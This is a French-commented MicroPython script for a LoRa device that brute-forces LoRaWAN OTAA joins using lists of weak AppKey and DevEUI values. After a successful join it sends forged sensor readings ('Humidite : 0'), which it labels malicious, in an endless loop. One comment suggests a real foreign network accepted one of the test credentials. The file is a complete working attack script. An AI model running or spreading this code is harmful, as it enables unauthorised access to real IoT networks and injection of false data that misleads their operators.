# Bibliothèque pour brute force des App Key et Dev EUI
from network import LoRa
import socket
import time
import ubinascii

# Initialise LoRa en mode LORAWAN
lora = LoRa(mode=LoRa.LORAWAN, region=LoRa.EU868)

# Création d'une bibliothèque de clés basiques
# Exemple de clés courantes et faibles
app_key_list = [
    ubinascii.unhexlify('11111111111111111111111111111111'),
    ubinascii.unhexlify('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'),
    ubinascii.unhexlify('00000000000000000000000000000000'),
    ubinascii.unhexlify('1234567890ABCDEF1234567890ABCDEF'),
    ubinascii.unhexlify('FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'),
    ubinascii.unhexlify('01010101010101010101010101010101'),
    ubinascii.unhexlify('11223344556677881122334455667788'),
    ubinascii.unhexlify('ABCDEFABCDEFABCDEFABCDEFABCDEFAB')
]

dev_eui_list = [
    #ubinascii.unhexlify('1111111111111111'),#suppression de cette ligne pour notre exemple, car un réseau étranger semble avoir ces identifiants
    ubinascii.unhexlify('AAAAAAAAAAAAAAAA'),
    ubinascii.unhexlify('0000000000000000'),
    ubinascii.unhexlify('1234567890ABCDEF'),
    ubinascii.unhexlify('FFFFFFFFFFFFFFFF'),
    ubinascii.unhexlify('0101010101010101'),
    ubinascii.unhexlify('ABCDEFABCDEFABCD')
]

app_eui = ubinascii.unhexlify('0000000000000000') #reste fixe

# Fonction de brute force
for app_key in app_key_list:
    for dev_eui in dev_eui_list:
        # Affichage de la combinaison testée
        print("Test de AppKey")
        print(ubinascii.hexlify(app_key))
        print("Test de DevEUI")
        print(ubinascii.hexlify(dev_eui))

        # Initialisation de la tentative de connexion OTAA
        lora.join(activation=LoRa.OTAA, auth=(dev_eui, app_eui, app_key), timeout=0)

        # Attente jusqu'à rejoindre le réseau avec un timeout
        timeout = 10  # Durée maximale en secondes
        start_time = time.time()
        while not lora.has_joined() and (time.time() - start_time) < timeout:
            time.sleep(2.5)
            print("En attente de connexion...")

        if lora.has_joined():
            print("\nReseau rejoint avec succes")

            # Création d'une socket LoRa
            s = socket.socket(socket.AF_LORA, socket.SOCK_RAW)

            # Configuration du débit de données
            s.setsockopt(socket.SOL_LORA, socket.SO_DR, 5)

            # Envoi de données malveillantes en boucle
            while True:
                s.setblocking(True)
                s.send("Humidite : 0".encode('utf-8'))

                # Récupérer les éventuelles réponses
                s.setblocking(False)
                data = s.recv(64)
                print(data)

                time.sleep(5)  # Intervalle entre les envois

            # Quitter la boucle si le réseau est rejoint
            break
        else:
            print("Echec de la connexion pour cette combinaison")

    # Quitter la boucle externe si le réseau est rejoint
    if lora.has_joined():
        break

print("Fin de la tentative de brute force")
